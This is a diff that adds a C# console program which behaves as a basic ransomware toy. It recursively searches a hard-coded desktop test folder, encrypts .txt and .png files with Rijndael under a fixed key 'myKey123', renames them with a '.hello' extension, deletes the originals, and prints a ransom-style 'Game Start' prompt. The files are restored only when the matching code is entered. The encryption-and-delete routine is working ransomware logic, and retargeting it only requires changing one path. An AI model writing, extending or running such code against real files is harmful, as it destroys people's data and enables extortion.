@@ -1,0 +1,129 @@
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.IO;
+using System.IO.Compression;
+using System.Security.Cryptography;
+
+namespace haveaniceday
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("Your file has just been encrypted.");
+            Console.WriteLine("if you match the Code, All files going to decryt");
+            Console.WriteLine("Game Start");
+
+            while (true)
+            {                
+                Console.WriteLine("Try input the Decrypt Code: ");
+                Program pro = new Program();
+                pro.searchfile();
+
+                string input;
+                input = Console.ReadLine();
+                pro.unlockfile(input);                
+            }            
+        }
+
+        public void searchfile()
+        {
+            string[] files = Directory.GetFiles("C:\\Users\\qwert\\Desktop\\실험대상", "*.*", SearchOption.AllDirectories);
+            string password = @"myKey123"; // Your Key Here
+
+            for (int i=0;i<files.Length;i++)
+            {
+                string name = files[i];
+                string[] targetExtensions = { "txt", "png" };
+                for (int j=0;j<targetExtensions.Length;j++)
+                {
+                    string value = targetExtensions[j];
+                    if (name.EndsWith(value))
+                    {
+                        FileStream fsIn = new FileStream(name, FileMode.Open);      //인풋
+                        byte[] key = Encoding.Unicode.GetBytes(password);
+                        string cryptFile = name+".hello";         //아웃풋
+                        FileStream fsCrypt = new FileStream(cryptFile, FileMode.Create);
+
+                        RijndaelManaged RMCrypto = new RijndaelManaged();
+                        CryptoStream cs = new CryptoStream(fsCrypt, RMCrypto.CreateEncryptor(key, key), CryptoStreamMode.Write);
+
+
+                        int data;
+                        while ((data = fsIn.ReadByte()) != -1)
+                        {
+                            cs.WriteByte((byte)data);
+                        }
+
+                        fsIn.Close();
+                        FileInfo fileDel = new FileInfo(name);
+                        fileDel.Delete();
+                        cs.Close();
+                        fsCrypt.Close();
+                    }
+                    
+                }
+               
+            }
+            
+        }
+
+        public void unlockfile(string input)
+        {
+            string password = @"myKey123"; // Your Key Here
+            if (input == password)
+            {
+                Console.WriteLine("Congratulation!!!");
+
+                string[] files = Directory.GetFiles("C:\\Users\\qwert\\Desktop\\실험대상", "*.*", SearchOption.AllDirectories);
+
+                for (int i = 0; i < files.Length; i++)
+                {
+                    string name = files[i];
+                    string[] targetExtensions = { ".hello" };
+                    for (int j = 0; j < targetExtensions.Length; j++)
+                    {
+                        string value = targetExtensions[j];
+                        if (name.EndsWith(value))
+                        {
+                            
+                            byte[] key = Encoding.Unicode.GetBytes(password);                        
+
+                            FileStream fsCrypt = new FileStream(name, FileMode.Open);   //인풋
+                            RijndaelManaged RMCrypto = new RijndaelManaged();
+                            CryptoStream cs = new CryptoStream(fsCrypt, RMCrypto.CreateDecryptor(key, key), CryptoStreamMode.Read);
+
+                            string unlockfile = name.Replace(".hello", "");             //아웃풋
+                            FileStream fsout = new FileStream(unlockfile, FileMode.Create);     
+                            int data;
+                            while ((data = cs.ReadByte()) != -1)
+                            {
+                                fsout.WriteByte((byte)data);
+                            }
+                            fsCrypt.Close();
+                            cs.Close();
+                            fsout.Close();
+                            FileInfo fileDel = new FileInfo(name);
+                            fileDel.Delete();                       
+                            
+                        }
+
+                    }
+
+                }
+                Console.ReadKey();
+                Environment.Exit(0);
+            }
+            else
+            {
+                Console.Clear();
+                Console.WriteLine("Oops...");
+            }
+            
+        }
+    }
+}
+
